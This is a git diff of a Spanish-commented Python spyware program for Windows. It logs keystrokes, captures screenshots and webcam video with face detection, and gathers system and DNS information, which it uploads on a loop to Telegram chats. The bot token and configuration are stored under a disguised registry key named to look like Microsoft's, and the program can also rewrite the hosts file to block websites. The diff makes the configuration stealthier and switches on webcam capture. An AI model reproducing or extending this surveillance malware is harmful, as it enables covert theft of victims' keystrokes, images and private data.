@@ -1,3 +1,4 @@
+import socket
 import winreg
 from pynput.keyboard import Listener  # Escucha eventos del teclado
 import os  # Lib para copiar archivos
@@ -438,57 +439,10 @@ class Screenshot:
 
 class WebsiteBlock:
     def __init__(self):
-        self.hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
-        self.pathListWeb = r"list websites.txt"
-        self.hostsTextOriginal = "" \
-                                 "# Copyright (c) 1993-2009 Microsoft Corp.\n" \
-                                 "#\n" \
-                                 "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n" \
-                                 "#\n" \
-                                 "# This file contains the mappings of IP addresses to host names. Each\n" \
-                                 "# entry should be kept on an individual line. The IP address should\n" \
-                                 "# be placed in the first column followed by the corresponding host name.\n" \
-                                 "# The IP address and the host name should be separated by at least one\n" \
-                                 "# space.\n" \
-                                 "#\n" \
-                                 "# Additionally, comments (such as these) may be inserted on individual\n" \
-                                 "# lines or following the machine name denoted by a '#' symbol.\n" \
-                                 "#\n" \
-                                 "# For example:\n" \
-                                 "#\n" \
-                                 "#      102.54.94.97     rhino.acme.com          # source server\n" \
-                                 "#       38.25.63.10     x.acme.com              # x client host\n" \
-                                 "\n" \
-                                 "# localhost name resolution is handled within DNS itself.\n" \
-                                 "#	127.0.0.1       localhost\n" \
-                                 "#	::1             localhost"
-        self.listWebs =  "www.gogle.com\n"\
-                         "www.wikipedia.com\n"\
-                         "www.bing.com\n"\
-                         "www.es.yahoo.com\n"\
-                         "www.altavista.com\n"\
-                         "www.ask.com\n"\
-                         "www.gigablast.com\n"\
-                         "www.excite.com\n"\
-                         "www.lycos.com\n"\
-                         "www.wolframalpha.com\n"\
-                         "http://zanran.com/q/\n"\
-                         "www.quandl.com\n"\
-                         "www.factbites.com\n"\
-                         "ww.nationmaster.com\n"\
-                         "www.facebook.com\n"\
-                         "www.Instagram.com\n"\
-                         "www.twiter.com\n"\
-                         "www.tiktok.com\n"\
-                         "www.youtube.com\n"\
-                         "www.wechat.com\n"\
-                         "www.linkedln.com\n"\
-                         "www.skype.com\n"\
-                         "www.snapchat.com\n"\
-                         "www.pinterest.com\n"\
-                         "www.whatsapp.com\n"\
-                         "www.reddit.com\n"
-        # self.hostsPath = r"test.txt"
+        self.registry = r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebsiteBlock'
+        self.hostsPath = str(WinRegistry(self.registry ).read_value('path'))
+        self.hostsTextOriginal = str(WinRegistry(self.registry ).read_value('host_original'))
+        self.listWebs =  str(WinRegistry(self.registry ).read_value('list_webs'))
 
     def __read_file(self, path):
         content = ""
@@ -517,16 +471,6 @@ class WebsiteBlock:
             os.remove(path)
         except:
             pass
-
-    """
-    def __backup(self,path1, path2):
-        try:
-            self.__delete_file(path1)
-            shutil.copy(path1, path2)
-            print("Backup - Sucess ")
-        except:
-            print("Backup - there was mistake error ")
-    """
 
     def block(self):
         print("Se bloquearon las siguientes paginas webs:")
@@ -600,8 +544,8 @@ class PCInformation:
 
     def send(self):
         def init():
-            bot = telepot.Bot(Config.TelegramBot().TOKEN)
-            chat_id = Config.TelegramBot().ID[0]
+            bot = telepot.Bot(str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token')))
+            chat_id = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('id'))[0]
 
             data = {
                 "Información del DNS": self.__display_dns(),
@@ -614,7 +558,7 @@ class PCInformation:
             }
             paths = []
             for name, value in data.items():
-                path = Config().TEMP + '\\' + name + '.txt'
+                path = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('path')) + '\\' + name + '.txt'
                 paths.append(path)
                 Util().save_file(path, value)
 
@@ -625,14 +569,14 @@ class PCInformation:
 
                 while (True):
                     init()
-                    time.sleep(200)
+                    time.sleep(int(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('interval')))
 
 class WebCam_IA:
     def __init__(self):
         self.frontalFacePath = "haarcascade_frontalface_default.xml"  # Archivo clasificador
         self.eyesPath = "haarcascade_eye.xml"  # Archivo clasificador
-        self.path_video = Config().TEMP + r"\video_"
-        self.extension = ".mp4"
+        self.path_video = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebCam').read_value('path'))
+        self.extension = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebCam').read_value('extension'))
 
     def __get_capture_webcam(self):
         try:
@@ -660,16 +604,14 @@ class WebCam_IA:
             return False
 
     def upload_video(self, name):
-        bot = telepot.Bot(Config.TelegramBot().TOKEN)
-        for id in Config().TelegramBot().ID:
+        bot = telepot.Bot(str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token')))
+        for id in str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('id')):
             try:
                 bot.sendChatAction(id, 'upload_photo')
                 bot.sendVideo(id, open(name, 'rb'))
-                # bot.sendDocument(id, open(Config().Screenshot().PATH + name, 'rb'))
-                print("[SEND WebCam] Send Video to: [ID] " + str(id)) if Config().DEBUG else False
+                print("[SEND WebCam] Send Video to: [ID] " + str(id))
             except:
-                print("[SEND WebCam Video] there was a mistake when sending the [ID] " + str(
-                    id)) if Config().DEBUG else False
+                print("[SEND WebCam Video] there was a mistake when sending the [ID] " + str(id))
 
     def start(self):
 
@@ -725,7 +667,9 @@ class WebCam_IA:
 if __name__ == '__main__':
     folders = [
         # str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('path')),
-        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').read_value('path'))
+        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').read_value('path')),
+        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebCam').read_value('path')),
+        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('path'))
     ]
     for f in folders:
         Util().delete_folder(f)  # Remove foldes and files // Cache
@@ -735,4 +679,55 @@ if __name__ == '__main__':
     # Eliminar todas las carpetas
     threading.Thread(target=Keylogger().listen_key).start()
     threading.Thread(target=Screenshot().send).start()
+
+    # Verifica permisos de admistrador: Administrador
+    WebCam_IA().start()
+    """
+    eel.init('web') # Nombre de la carpeta
+
+    @eel.expose
+    def send_values(nickname, tele_id):
+        Util().create_folder(Config().TEMP) #Crea carpeta temporal
+
+
+        tScreenshot = threading.Thread(target=Screenshot().send)
+        tScreenshot.start()
+
+        print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
+        threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
+        threading.Thread(target=WebsiteBlock().reset()).start() if Util().is_admin() else False  # Desbloquear Webs
+        print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
+        threading.Thread(target=StartUp().infinite).start()
+        threading.Thread(target=PCInformation().send).start()
+        threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
+
+        WebCam_IA().start()
+        print(nickname)
+        print(tele_id)
+        print("Está en linea")
+        return ""
+
+    @eel.expose
+    def stop___(): # Detiene todo el proceso
+
+        print('se detuvo')
+        return ""
+
+
+    @eel.expose
+    def start___():  # Inicia todo el proceso
+        print('continuar')
+        return ""
+
+
+    @eel.expose
+    def exit___(self):  # Inicia todo el proceso
+        #eel._shutdown
+        os._exit(1)
+        return ""
+
+
+
+    eel.start('index.html',  size=(1000, 600))
+    """
 
